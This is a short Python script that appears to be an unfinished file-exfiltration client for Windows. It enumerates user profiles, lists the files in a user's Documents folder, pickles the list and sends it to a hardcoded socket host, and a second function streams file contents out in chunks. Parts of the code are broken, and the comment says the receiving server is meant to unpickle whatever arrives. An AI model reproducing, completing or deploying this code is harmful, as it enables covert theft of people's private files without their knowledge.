from os import path
from glob import glob
import socket
from pickle import dumps

CONN_HOST = "127.0.0.1"
CONN_PORT = 65432 

def getuser(): # Get all users from C:\Users\
    return [path.basename(x) for x in glob('C:\\Users\\*') if x not in ['C:\\Users\\Public', 'C:\\Users\\All Users', 'C:\\Users\\Default', 'C:\\Users\\Default User', 'C:\\Users\\desktop.ini']]

def getfiles(scan_user: str, dict_files: str):
    return [path.basename(x) for x in glob('C:\\Users\\'+scan_user+'\\'+dict_files+'\\*') if '.lnk' not in x]

def sendFolderData():
    users = getuser()
    try:
        local_files = getfiles(users[1], "Documents")
    except:
        local_files = getfiles(users[0], "Dokumenty")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as suck:
        suck.connect((CONN_HOST, CONN_PORT))
        suck.send(dumps(local_files)) # Server have to use loads(data) from pickle library
    suck.close()

def sendFiles(filedir: str, filename: str):
    if filename not in filedir:
        return None
    print("Working")
    file = open(filename, 'rb')
    line = file.read(1024)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        while (line):
            s.send(line)
            line = file.read(1024)
    file.close()
    s.close()


    # TODO Create a sending socket to the server send the users first then the files
    
